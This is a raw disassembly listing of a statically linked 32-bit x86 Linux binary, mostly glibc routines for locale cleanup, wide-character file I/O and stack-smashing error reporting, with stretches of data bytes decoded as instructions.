call fcn.08051180
jmp 0x8091d44
call fcn.08091d20
jmp 0x8091d37
call fcn.08091d20
jmp 0x8091d30
push ebp
mov ebp, esp
push esi
mov esi, 0
push ebx
xor ebx, ebx
sub esp, 0xc
nop
cmp ebx, 6
je 0x8091f91
test esi, esi
je 0x8091fc0
mov dword [esp], 3
call section.
mov edx, eax
mov eax, dword [ebx*4 + 0x80a99c0]
mov dword [var_8h_2], eax
mov eax, dword [edx + ebx*4]
mov dword [esp], ebx
mov dword [var_ch], eax
call fcn.08091ec0
inc ebx
cmp ebx, 0xc
jle 0x8091f60
mov eax, dword [0x80a9a98]
cmp eax, 0x80a0139
je 0x8091fb5
mov dword [esp], eax
call fcn.08051180
mov dword [0x80a9a98], 0x80a0139
add esp, 0xc
pop ebx
pop esi
leave
jmp 0x8092000
mov edx, dword [0x80a9ab4]
jmp 0x8091f77
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edi, dword [0x80aa920]
test edi, edi
je 0x8092052
mov esi, edi
xor ebx, ebx
mov edi, dword [edi]
mov eax, dword [esi + 4]
mov dword [esp], eax
call fcn.08051180
cmp ebx, 6
je 0x8092040
mov eax, dword [esi + ebx*4 + 8]
mov edx, dword [eax + 0x10]
test edx, edx
jne 0x80920c0
mov dword [esp], eax
call fcn.08051180
inc ebx
cmp ebx, 0xc
jle 0x8092024
mov dword [esp], esi
call fcn.08051180
test edi, edi
jne 0x8092013
mov eax, dword [0x80aa8a0]
mov dword [0x80aa920], 0
test eax, eax
je 0x80920b8
cmp eax, 0x80aa8a4
jne 0x80920cb
mov eax, dword [0x80aa8ac]
mov dword [0x80aa8a0], 0
mov dword [var_4h], eax
mov eax, dword [0x80aa8a4]
mov dword [esp], eax
call fcn.08054780
mov esi, dword [0x80aa8b0]
test esi, esi
je 0x80920b8
mov ebx, esi
mov esi, dword [esi + 0xc]
mov eax, dword [ebx + 8]
mov dword [var_4h], eax
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08054780
mov dword [esp], ebx
call fcn.08051180
test esi, esi
jne 0x8092096
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
call edx
mov eax, dword [esi + ebx*4 + 8]
jmp 0x8092038
mov dword [var_ch], str._nl_archive_subfreeres
mov dword [var_8h], 0x212
mov dword [var_4h], str.loadarchive.c
mov dword [esp], str.archmapped__headmap
call fcn.0805efc0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [var_77h], dl
in eax, 0x53
sub esp, 8
mov eax, dword [0x80aad20]
test eax, eax
je 0x8092147
mov ebx, eax
mov eax, dword [eax]
mov dword [0x80aad20], eax
mov eax, dword [ebx + 4]
cmp eax, 0x80a01a1
je 0x809212b
mov dword [esp], eax
call fcn.08051180
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call fcn.08051180
mov dword [esp], ebx
call fcn.08051180
mov eax, dword [0x80aad20]
test eax, eax
jne 0x8092110
mov eax, dword [0x80a9ac0]
cmp eax, str.messages
je 0x809215b
mov dword [esp], eax
call fcn.08051180
mov eax, dword [0x80aa944]
mov dword [var_4h_2], fcn.08051180
mov dword [esp], eax
call fcn.0807a7f0
mov edx, dword [0x80aa948]
mov dword [0x80aa944], 0
test edx, edx
jne 0x809218a
add esp, 8
pop ebx
leave
ret
mov eax, edx
mov edx, dword [edx]
mov dword [esp], eax
mov dword [0x80aa948], edx
call fcn.08051180
mov edx, dword [0x80aa948]
test edx, edx
jne 0x809218a
jmp 0x8092184
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 4
mov ebx, dword [0x80aa94c]
test ebx, ebx
je 0x80921f4
mov eax, dword [ebx + 8]
mov esi, ebx
test eax, eax
jne 0x8092200
mov ebx, dword [ebx + 0xc]
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08051180
mov dword [esp], esi
call fcn.08051180
test ebx, ebx
jne 0x80921d2
add esp, 4
pop ebx
pop esi
leave
ret
nop
lea esi, [esi]
call fcn.08092240
jmp 0x80921db
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
test eax, eax
je 0x807a800
leave
jmp fcn.0807a7a0
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_bp_4h], ebx
mov edx, dword [eax + 0x10]
mov ebx, eax
test edx, edx
jne 0x805e46e
mov eax, dword [ebx + 0xc]
cmp eax, 1
jne 0x805e45b
mov eax, dword [ebx + 8]
mov dword [var_4h_2], eax
mov eax, dword [ebx + 4]
mov dword [esp], eax
call fcn.08054780
mov eax, dword [ebx + 0xc]
cmp eax, 2
je 0x805e44e
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08051180
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_bp_4h]
leave
ret
jg 0x805e43f
test eax, eax
jne 0x805e43f
mov eax, dword [ebx + 4]
mov dword [esp], eax
call fcn.08051180
jmp 0x805e43c
call edx
jmp 0x805e422
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov edi, dword [arg_10h]
mov esi, dword [arg_8h]
cmp dword [arg_ch], edi
mov ebx, dword [esi*4 + 0x80aace0]
je 0x8091f0e
mov eax, dword [esi*4 + 0x8093f20]
mov dword [esi*4 + 0x80a9a40], edi
test eax, eax
jne 0x8091f45
mov eax, dword [esi*4 + 0x80a9a80]
cmp eax, 0x80a0139
je 0x8091f0e
mov dword [esp], eax
call fcn.08051180
mov dword [esi*4 + 0x80a9a80], 0x80a0139
test ebx, ebx
je 0x8091f3d
mov eax, dword [ebx + 8]
mov esi, ebx
test eax, eax
je 0x8091f24
cmp eax, edi
je 0x8091f24
call fcn.0805e410
mov ebx, dword [ebx + 0xc]
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08051180
mov dword [esp], esi
call fcn.08051180
test ebx, ebx
jne 0x8091f12
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
call eax
jmp 0x8091eed
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, eax
mov eax, dword [eax + 0x44]
cmp eax, 0x80a9b04
je 0x809225a
call fcn.08062900
mov eax, ebx
call fcn.08060690
mov eax, dword [ebx + 0x10]
test eax, eax
jne 0x8092299
mov eax, dword [ebx + 4]
test eax, eax
je 0x809228d
mov eax, dword [ebx + 8]
mov dword [var_sp_4h], eax
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08054780
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08051180
jmp 0x8092280
mov dword [esp], eax
call fcn.08051180
jmp 0x8092268
pop ebx
add ebx, 0x17873
push edx
call fcn.08048190
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
cmp byte [section..bss], 0
jne 0x80481e1
mov eax, dword [0x80a9008]
mov edx, dword [eax]
test edx, edx
je 0x80481c5
lea esi, [esi]
add eax, 4
mov dword [0x80a9008], eax
call edx
mov eax, dword [0x80a9008]
mov edx, dword [eax]
test edx, edx
jne 0x80481b0
mov eax, 0
test eax, eax
je 0x80481da
mov dword [esp], section..eh_frame
call section.
mov byte [section..bss], 1
leave
ret
add dword [ecx], eax
add byte [eax], al
add al, 1
add byte [eax], al
pop es
add dword [eax], eax
add byte [ebx], cl
add dword [eax], eax
add byte [edi], cl
add dword [eax], eax
add byte [ebx], dl
add dword [eax], eax
add byte [edi], dl
add dword [eax], eax
add byte [edx], bl
add dword [eax], eax
add byte [ecx + eax], bl
add byte [eax], al
push ds
add dword [eax], eax
add byte [eax], ah
add dword [eax], eax
add byte [edx], ah
add dword [eax], eax
add byte [esi], ah
add dword [eax], eax
add byte [ebx], ch
add dword [eax], eax
add byte [eax], dh
add dword [eax], eax
add byte [0x38000001], dh
add dword [eax], eax
add byte [0x42000001], bh
add dword [eax], eax
add byte [ebp + 1], al
add byte [eax], al
dec eax
add dword [eax], eax
add byte [ebx + 1], cl
add byte [eax], al
dec esi
add dword [eax], eax
add byte [ecx + 1], dl
add byte [eax], al
push esp
add dword [eax], eax
add byte [edi + 1], dl
add byte [eax], al
pop edx
add dword [eax], eax
add byte [ebp + 1], bl
add byte [eax], al
pushal
add dword [eax], eax
add byte [ecx + eax], ah
add byte [edi + 1], ah
add byte [eax], al
push 1
add byte [eax], al
insd dword es:[edi], dx
add dword [eax], eax
add byte [eax + 1], dh
add byte [eax], al
jae 0x8098727
add byte [eax], al
add byte [eax + 1], bh
add byte [eax], al
add byte [esi + 1], bh
add byte [eax], al
add byte [ecx - 0x79ffffff], al
add dword [eax], eax
add byte [ecx - 0x73ffffff], cl
add dword [eax], eax
add byte [edi - 0x6dffffff], cl
add dword [eax], eax
add byte [ebp - 0x67ffffff], dl
add dword [eax], eax
add byte [ebx - 0x61ffffff], bl
add dword [eax], eax
add byte [ecx - 0x5bffffff], ah
add dword [eax], eax
add byte [edi - 0x55ffffff], ah
add dword [eax], eax
add byte [ebp - 0x4fffffff], ch
add dword [eax], eax
add byte [ebx - 0x45ffffff], dh
add dword [eax], eax
add cl, al
add dword [eax], eax
add al, cl
add dword [eax], eax
add bh, cl
add dword [eax], eax
add dh, dl
add dword [eax], eax
add ch, bl
add dword [eax], eax
add ah, ah
add dword [eax], eax
add bl, ch
add dword [eax], eax
add dl, dh
add dword [eax], eax
add cl, bh
add dword [eax], eax
add byte [eax], al
add al, byte [eax]
add byte [edi], al
add al, byte [eax]
add byte [edx + eax], cl
add byte [eax], al
lar eax, word [eax]
add byte [ebx], dl
add al, byte [eax]
add byte [eax], bl
add al, byte [eax]
add byte [edx + eax], bl
add byte [eax], al
pop ds
add al, byte [eax]
add byte [ebx], ah
add al, byte [eax]
add byte [eax], ch
add al, byte [eax]
add byte [esi], ch
add al, byte [eax]
add byte [edx], dh
add al, byte [eax]
add byte [0x39000002], dh
add al, byte [eax]
add byte [esi], bh
add al, byte [eax]
add byte [ecx + 2], al
add byte [eax], al
inc esp
add al, byte [eax]
add byte [edi + 2], al
add byte [eax], al
dec edx
add al, byte [eax]
add byte [ebp + 2], cl
add byte [eax], al
push ecx
add al, byte [eax]
add byte [esi + 2], dl
add byte [eax], al
pop edx
add al, byte [eax]
add byte [ebp + 2], bl
add byte [eax], al
popal
add al, byte [eax]
add byte [esi + 2], ah
add byte [eax], al
insb byte es:[edi], dx
add al, byte [eax]
add byte [eax + 2], dh
add byte [eax], al
jae 0x8098810
add byte [eax], al
ja 0x8098814
add byte [eax], al
jl 0x8098818
add byte [eax], al
jg 0x809881c
add byte [eax], al
add byte [edx], 0
add byte [ebp - 0x77fffffe], al
add al, byte [eax]
add byte [edx + eax + 0x2900000], cl
add byte [eax], al
xchg ebp, eax
add al, byte [eax]
add byte [ecx - 0x62fffffe], bl
add al, byte [eax]
add byte [edx - 0x5afffffe], ah
add al, byte [eax]
add byte [eax - 0x54fffffe], ch
add al, byte [eax]
add byte [esi - 0x4efffffe], ch
add al, byte [eax]
add byte [edx + eax + 0x2b70000], dh
add byte [eax], al
mov ebx, 0xbf000002
add al, byte [eax]
add bl, al
add al, byte [eax]
add bh, al
add al, byte [eax]
add ah, cl
add al, byte [eax]
add cl, dl
add al, byte [eax]
add dh, dl
add al, byte [eax]
add bl, bl
add al, byte [eax]
add al, ah
add al, byte [eax]
add ch, ah
add al, byte [eax]
add dl, ch
add al, byte [eax]
add bh, ch
add al, byte [eax]
add ah, dh
add al, byte [eax]
add cl, bh
add al, byte [eax]
add ch, bh
add al, byte [eax]
add byte [ecx], al
add eax, dword [eax]
add byte [0x9000003], al
add eax, dword [eax]
add byte [0x11000003], cl
add eax, dword [eax]
add byte [0x19000003], dl
add eax, dword [eax]
add byte [esi], bl
add eax, dword [eax]
add byte [ebx], ah
add eax, dword [eax]
add byte [eax], ch
add eax, dword [eax]
add byte [0x32000003], ch
add eax, dword [eax]
add byte [edi], dh
add eax, dword [eax]
add byte [ebx + eax], bh
add byte [eax], al
inc ecx
add eax, dword [eax]
add byte [esi + 3], al
add byte [eax], al
dec edx
add eax, dword [eax]
add byte [edi + 3], cl
add byte [eax], al
push esp
add eax, dword [eax]
add byte [eax + 3], bl
add byte [eax], al
pop esp
add eax, dword [eax]
add byte [eax + 3], ah
add byte [eax], al
add eax, dword fs:[eax]
add byte [eax + 3], ch
add byte [eax], al
insd dword es:[edi], dx
add eax, dword [eax]
add byte [eax + 3], dh
add byte [eax], al
je 0x8098905
add byte [eax], al
jns 0x8098909
add eax, dword [eax]
add byte [eax], al
jle 0x809890d
add eax, dword [eax]
add byte [eax], al
add dword [ebx], 0
add eax, dword [eax]
add byte [eax - 0x72fffffd], cl
add eax, dword [eax]
add byte [edx - 0x68fffffd], dl
add eax, dword [eax]
add byte [ebx + eax + 0x3a10000], bl
add byte [eax], al
cmpsd dword [esi], dword ptr es:[edi]
add eax, dword [eax]
add byte [ebp - 0x4cfffffd], ch
add eax, dword [eax]
add byte [ecx - 0x40fffffd], bh
add eax, dword [eax]
add ch, al
add eax, dword [eax]
add bl, cl
add eax, dword [eax]
add cl, dl
add eax, dword [eax]
add bh, dl
add eax, dword [eax]
add ch, bl
add eax, dword [eax]
add bl, ah
add eax, dword [eax]
add al, ch
add eax, dword [eax]
add ch, ch
add eax, dword [eax]
add dl, dh
add eax, dword [eax]
add bh, dh
add eax, dword [eax]
add ah, bh
add eax, dword [eax]
add byte [ecx], al
add al, 0
add byte [esi], al
add al, 0
add byte [ebx], cl
add al, 0
add byte [eax], dl
add al, 0
add byte [esi], dl
add al, 0
add byte [esp + eax], bl
add byte [eax], al
and al, byte [eax + eax]
add byte [eax], ch
add al, 0
add byte [esi], ch
add al, 0
add byte [esp + eax], dh
add byte [eax], al
cmp al, byte [eax + eax]
add byte [eax + 4], al
add byte [eax], al
inc esi
add al, 0
add byte [esp + eax], cl
add byte [edx + 4], dl
add byte [eax], al
push esi
add al, 0
add byte [edx + 4], bl
add byte [eax], al
pop esi
add al, 0
add byte [edx + 4], ah
add byte [eax], al
add al, 0
add byte [edx + 4], ch
add byte [eax], al
outsb dx, byte [esi]
add al, 0
add byte [edx + 4], dh
add byte [eax], al
jbe 0x80989ca
add byte [eax], al
jnp 0x80989ce
add byte [eax], al
add byte [eax + eax], 0
add byte [eax], al
test dword [eax + eax], eax
add byte [edx - 0x70fffffc], cl
add al, 0
add byte [esp + eax + 0x4990000], dl
add byte [eax], al
sahf
add al, 0
add byte [ebx - 0x57fffffc], ah
add al, 0
add byte [ebp - 0x4dfffffc], ch
add al, 0
add byte [edi - 0x43fffffc], dh
add al, 0
add cl, al
add al, 0
add dh, al
add al, 0
add bl, cl
add al, 0
add al, dl
add al, 0
add ch, dl
add al, 0
add dl, bl
add al, 0
add bh, bl
add al, 0
add ah, ah
add al, 0
add cl, ch
add al, 0
add dh, ch
add al, 0
add bl, dh
add al, 0
add al, bh
add al, 0
add ch, bh
add al, 0
add byte [edx], al
add eax, 0x5070000
add byte [eax], al
or al, 5
add byte [eax], al
adc dword [0x5160000], eax
add byte [eax], al
sbb eax, dword [0x5200000]
add byte [eax], al
and eax, 0x2a000005
add eax, 0x52f0000
add byte [eax], al
xor al, 5
add byte [eax], al
cmp dword [0x53e0000], eax
add byte [eax], al
inc ebx
add eax, 0x5480000
add byte [eax], al
dec ebp
add eax, 0x5520000
add byte [eax], al
push edi
add eax, 0x55c0000
add byte [eax], al
popal
add eax, 0x5660000
add byte [eax], al
imul eax, dword [0x5700000], 0
add byte [ebp + 5], dh
add byte [eax], al
jp 0x8098a9b
add byte [eax], al
jg 0x8098a9f
add byte [eax], al
add byte [ebp + eax + 0x5890000], al
add byte [ecx - 0x71fffffb], cl
add byte [eax], al
mov es, word [0x5930000]
add byte [eax], al
cwde
add eax, 0x59d0000
add byte [eax], al
mov byte [0xa7000005], al
add eax, 0x5ac0000
add byte [eax], al
mov cl, 5
add byte [eax], al
mov dh, 5
add byte [eax], al
mov ebx, 0xc0000005
add eax, 0x5c50000
add byte [eax], al
retf 5
push ebp
mov ebp, esp
push edi
push esi
lea edi, [var_2d8h]
push ebx
lea ebx, [var_3c8h]
sub esp, 0x3ec
mov eax, dword [str.:_stack_smashing_attack_in_function_]
mov dword [esp], ebx
mov dword [var_d8h], eax
mov eax, dword [0x8092810]
mov dword [var_d4h], eax
mov eax, dword [0x8092814]
mov dword [var_d0h], eax
mov eax, dword [0x8092818]
mov dword [var_cch], eax
mov eax, dword [0x809281c]
mov dword [var_c8h], eax
mov eax, dword [0x8092820]
mov dword [var_c4h], eax
mov eax, dword [0x8092824]
mov dword [var_c0h], eax
mov eax, dword [0x8092828]
mov dword [var_bch], eax
mov eax, dword [0x809282c]
mov dword [var_b8h], eax
movzx eax, byte [0x8092830]
mov byte [var_b4h], al
call fcn.08049240
mov dword [esp], ebx
mov dword [var_4h], 6
call fcn.08049280
mov dword [esp], 0
mov dword [var_4h], ebx
mov dword [var_8h], 0
mov ebx, 0x200
call fcn.08049180
mov eax, dword [0x80a95a0]
mov dword [var_8h], 0x1fc
mov dword [var_2d8h], 0x3e323c
mov dword [var_4h], eax
lea eax, [var_2d8h]
mov dword [esp], eax
call fcn.080534b0
mov eax, dword [edi]
add edi, 4
lea edx, [eax - 0x1010101]
not eax
and edx, eax
and edx, 0x80808080
je 0x8048cf6
mov eax, edx
shr eax, 0x10
test edx, 0x8080
cmove edx, eax
lea eax, [edi + 2]
cmove edi, eax
lea eax, [var_2d8h]
add dl, dl
sbb edi, 3
sub edi, eax
cmp ebx, edi
jg 0x8048e64
lea eax, [edi - 3]
mov dword [esp], 2
mov dword [var_8h], eax
lea eax, [var_2d5h]
mov dword [var_4h], eax
call fcn.08053fd0
mov dword [esp], 2
mov dword [var_8h], 3
mov dword [var_4h], 0x80927fe
call fcn.08053fd0
mov dword [var_8h], 0
mov dword [var_4h], 2
mov dword [esp], 1
call fcn.08054930
cmp eax, 0xffffffff
mov esi, eax
je 0x8048df6
lea eax, [var_346h]
lea ebx, [var_348h]
mov word [var_348h], 1
mov dword [var_8h], 0x6b
mov dword [var_4h], str._dev_log
mov dword [esp], eax
call fcn.08053530
mov dword [esp], esi
lea eax, [var_2d8h]
mov byte [var_2dbh], 0
mov dword [var_14h], 0x6e
mov dword [var_3cch], ebx
mov dword [var_10h], ebx
mov dword [var_ch], 0
mov dword [var_8h], edi
mov dword [var_4h], eax
call fcn.080548d0
cld
xor eax, eax
lea edi, [var_a8h]
mov ecx, 0x23
rep stosd dword es:[edi], eax
lea ebx, [var_a8h]
lea eax, [var_a4h]
mov dword [esp], eax
call fcn.08049240
mov dword [esp], 6
mov dword [var_4h], ebx
mov dword [var_24h], 0
mov dword [var_a8h], 0
mov dword [var_8h], 0
call fcn.08049140
call fcn.08053db0
mov dword [var_4h], 6
mov dword [esp], eax
call fcn.08049220
mov dword [esp], 0x7f
call fcn.08053d90
mov eax, ebx
sub eax, edi
lea edi, [var_2d8h]
dec eax
mov dword [var_8h], eax
lea eax, [var_d8h]
mov dword [var_4h], eax
lea eax, [var_2d8h]
mov dword [esp], eax
call fcn.080534b0
nop
lea esi, [esi]
mov eax, dword [edi]
add edi, 4
lea edx, [eax - 0x1010101]
not eax
and edx, eax
and edx, 0x80808080
je 0x8048e90
mov eax, edx
shr eax, 0x10
test edx, 0x8080
cmove edx, eax
lea eax, [edi + 2]
cmove edi, eax
lea eax, [var_2d8h]
add dl, dl
sbb edi, 3
sub edi, eax
cmp ebx, edi
jle 0x8048d36
mov eax, ebx
sub eax, edi
lea edi, [var_2d8h]
dec eax
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
lea eax, [var_2d8h]
mov dword [esp], eax
call fcn.080534b0
mov eax, dword [edi]
add edi, 4
lea edx, [eax - 0x1010101]
not eax
and edx, eax
and edx, 0x80808080
je 0x8048ef4
mov eax, edx
shr eax, 0x10
test edx, 0x8080
cmove edx, eax
lea eax, [edi + 2]
cmove edi, eax
lea eax, [var_2d8h]
add dl, dl
sbb edi, 3
sub edi, eax
jmp 0x8048d36
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08049580
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov esi, dword [arg_8h]
mov eax, dword [esi]
test al, 4
jne 0x804a7c1
mov ecx, dword [esi + 0x58]
mov eax, dword [ecx]
cmp eax, dword [ecx + 4]
jb 0x804a670
mov eax, dword [esi + 0x54]
mov dword [var_28h], eax
mov eax, dword [esi + 4]
cmp eax, dword [esi + 8]
jb 0x804a71a
mov edx, dword [esi + 0x1c]
mov dword [esi + 8], edx
test edx, edx
mov dword [esi + 4], edx
mov dword [esi + 0xc], edx
jne 0x804a4c5
mov eax, dword [esi + 0x24]
test eax, eax
jne 0x804a707
mov dword [esp], esi
call fcn.0804dbb0
mov edx, dword [esi + 0x1c]
mov dword [esi + 8], edx
mov dword [esi + 4], edx
mov dword [esi + 0xc], edx
mov eax, dword [esi + 0x58]
mov dword [esi + 0x18], edx
mov dword [esi + 0x14], edx
mov dword [esi + 0x10], edx
mov ecx, dword [eax + 0x18]
test ecx, ecx
jne 0x804a4eb
mov eax, dword [eax + 0x20]
test eax, eax
jne 0x804a6f4
mov dword [esp], esi
call fcn.08076080
test dword [esi], 0x202
je 0x804a55a
mov edx, dword [0x80a9500]
xor ebx, ebx
cmp word [edx], 0
js 0x804a52c
mov eax, 0
test eax, eax
je 0x804a52c
lea eax, [var_10h_2]
mov dword [var_8h], edx
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
mov ebx, 1
call section.
mov edx, dword [0x80a9500]
cmp word [edx], 0
jns 0x804a6e1
mov eax, dword [edx]
and eax, 0x288
cmp eax, 0x280
je 0x804a6c2
cmp word [edx], 0
jns 0x804a6b5
test ebx, ebx
jne 0x804a69d
mov dword [esp], esi
xor edi, edi
call fcn.0804d770
mov eax, dword [esi + 0x58]
mov ecx, dword [esi + 8]
mov edx, dword [eax + 0x18]
mov dword [eax], edx
mov dword [eax + 8], edx
mov dword [eax + 4], edx
mov dword [eax + 0x14], edx
mov dword [eax + 0x10], edx
mov dword [eax + 0xc], edx
mov edx, dword [esi + 0x20]
mov eax, dword [esi + 0x94]
sub edx, ecx
mov dword [esp], esi
mov dword [var_8h], edx
mov dword [var_4h], ecx
call dword [eax + 0x38]
test eax, eax
mov edx, eax
jle 0x804a685
add dword [esi + 8], edx
test edx, edx
je 0x804a674
mov ecx, dword [esi + 0x4c]
mov ebx, dword [esi + 0x50]
mov eax, ecx
and eax, ebx
inc eax
je 0x804a5c6
mov eax, edx
cdq
add ecx, eax
adc ebx, edx
mov dword [esi + 0x4c], ecx
mov dword [esi + 0x50], ebx
mov ecx, dword [esi + 0x58]
mov eax, dword [ecx + 0x2c]
mov edx, dword [ecx + 0x30]
mov dword [ecx + 0x34], eax
mov dword [ecx + 0x38], edx
mov edx, dword [esi + 0x58]
mov ecx, dword [esi + 4]
lea eax, [edx + 4]
mov dword [esi + 0xc], ecx
mov dword [var_1ch], eax
mov eax, dword [edx + 0x1c]
mov dword [var_18h], eax
mov eax, dword [edx + 4]
add edx, 0x2c
mov dword [var_14h], eax
lea eax, [var_8h_2]
mov dword [var_10h], eax
mov eax, dword [esi + 8]
mov dword [var_4h], edx
mov dword [var_8h], ecx
mov dword [var_ch], eax
mov eax, dword [var_4h_2]
mov dword [esp], eax
call dword [eax + 0xc]
mov edx, dword [esi + 0x58]
mov ebx, eax
mov eax, dword [var_8h_2]
mov dword [esi + 4], eax
mov eax, dword [edx + 0x18]
cmp dword [edx + 4], eax
jne 0x804a668
cmp ebx, 2
je 0x804a648
mov eax, dword [esi + 8]
mov ecx, eax
mov eax, dword [esi + 0x20]
cmp ecx, eax
mov edx, eax
je 0x804a648
dec ebx
jne 0x804a7d6
inc edi
jmp 0x804a581
call fcn.08048b20
mov dword [eax], 0x54
or dword [esi], 0x20
mov eax, 0xffffffff
nop
lea esi, [esi]
add esp, 0x3c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edx]
lea esi, [esi]
mov eax, dword [eax]
jmp 0x804a660
test edi, edi
je 0x804a656
call fcn.08048b20
mov dword [eax], 0x54
jmp 0x804a656
jne 0x804a693
test edi, edi
jne 0x804a693
or dword [esi], 0x10
jmp 0x804a5a1
or dword [esi], 0x20
xor edx, edx
jmp 0x804a5a1
lea eax, [var_10h_2]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x804a55a
mov dword [esp], edx
call fcn.08074580
jmp 0x804a552
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h], 0xffffffff
call dword [eax + 0xc]
mov edx, dword [0x80a9500]
jmp 0x804a548
mov dword [esp], edx
call fcn.08074540
mov edx, dword [0x80a9500]
jmp 0x804a536
mov dword [esp], eax
call fcn.08051180
and dword [esi], 0xfffffeff
jmp 0x804a4e3
mov dword [esp], eax
call fcn.08051180
and dword [esi], 0xfffffeff
jmp 0x804a4b1
mov edx, dword [ecx + 0x30]
mov dword [var_20h], eax
mov eax, dword [ecx + 0x2c]
mov dword [ecx + 0x38], edx
mov dword [ecx + 0x34], eax
mov edx, dword [esi + 0x58]
mov eax, dword [edx + 0x18]
mov dword [edx], eax
mov dword [edx + 8], eax
lea eax, [edx + 4]
mov dword [var_1ch], eax
mov eax, dword [edx + 0x1c]
mov dword [var_18h], eax
mov eax, dword [edx]
add edx, 0x2c
mov dword [var_14h], eax
lea eax, [var_20h]
mov dword [var_10h], eax
mov eax, dword [esi + 8]
mov dword [var_ch], eax
mov eax, dword [esi + 4]
mov dword [var_4h], edx
mov edx, dword [var_28h]
mov dword [var_8h], eax
mov dword [esp], edx
call dword [edx + 0xc]
mov ecx, dword [var_20h]
mov ebx, eax
mov eax, dword [esi + 4]
mov dword [esi + 4], ecx
mov dword [esi + 0xc], eax
mov eax, dword [esi + 0x58]
mov edx, dword [eax]
cmp edx, dword [eax + 4]
jae 0x804a78c
mov eax, dword [edx]
jmp 0x804a660
cmp ebx, 2
je 0x804a648
mov eax, dword [esi + 8]
mov dword [var_4h], ecx
sub eax, ecx
mov dword [var_8h], eax
mov eax, dword [esi + 0x1c]
mov dword [esp], eax
call fcn.08053690
mov edx, dword [esi + 0x1c]
mov eax, dword [esi + 8]
sub eax, dword [esi + 4]
lea eax, [eax + edx]
mov dword [esi + 8], eax
jmp 0x804a49c
or eax, 0x20
mov dword [esi], eax
call fcn.08048b20
mov dword [eax], 9
jmp 0x804a656
mov dword [var_ch], str._IO_wfile_underflow
mov dword [var_8h], 0x11b
mov dword [var_4h], str.wfileops.c
mov dword [esp], str.status____codecvt_partial
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x24
mov ebx, dword [var_4h]
mov eax, dword [ebx]
test al, 4
jne 0x804a90c
mov ecx, dword [ebx + 0x58]
mov eax, dword [ecx]
cmp eax, dword [ecx + 4]
jae 0x804a82a
mov edx, dword [eax]
add esp, 0x24
mov eax, edx
pop ebx
pop esi
leave
ret
mov eax, dword [ebx + 4]
mov esi, dword [ebx + 0x54]
cmp eax, dword [ebx + 8]
jae 0x804a8ed
mov dword [var_bp_ch], eax
mov eax, dword [ecx + 0x18]
test eax, eax
jne 0x804a859
mov eax, dword [ecx + 0x20]
test eax, eax
jne 0x804a8da
mov dword [esp], ebx
call fcn.08076080
mov ecx, dword [ebx + 0x58]
mov eax, dword [ecx + 0x2c]
mov edx, dword [ecx + 0x30]
mov dword [ecx + 0x34], eax
mov dword [ecx + 0x38], edx
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0x18]
mov dword [edx], eax
mov dword [edx + 8], eax
lea eax, [edx + 4]
mov dword [var_1ch_2], eax
mov eax, dword [edx + 0x1c]
mov dword [var_18h_2], eax
mov eax, dword [edx]
add edx, 0x2c
mov dword [var_14h_2], eax
lea eax, [var_bp_ch]
mov dword [var_10h_2], eax
mov eax, dword [ebx + 8]
mov dword [var_ch_2], eax
mov eax, dword [ebx + 4]
mov dword [esp], esi
mov dword [var_4h_2], edx
mov dword [var_8h_2], eax
call dword [esi + 0xc]
mov eax, dword [var_bp_ch]
mov dword [ebx + 4], eax
mov eax, dword [ebx + 0x58]
mov edx, dword [eax]
cmp edx, dword [eax + 4]
jae 0x804a8bd
mov edx, dword [edx]
jmp 0x804a821
call fcn.08048b20
mov dword [eax], 0x54
or dword [ebx], 0x20
nop
lea esi, [esi]
mov edx, 0xffffffff
jmp 0x804a821
mov dword [esp], eax
call fcn.08051180
and dword [ebx], 0xfffffeff
jmp 0x804a84e
mov dword [esp], ebx
call fcn.0804c380
mov edx, 0xffffffff
inc eax
je 0x804a821
mov ecx, dword [ebx + 0x58]
mov eax, dword [ebx + 4]
jmp 0x804a839
or eax, 0x20
mov dword [ebx], eax
call fcn.08048b20
mov dword [eax], 9
jmp 0x804a8d0
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
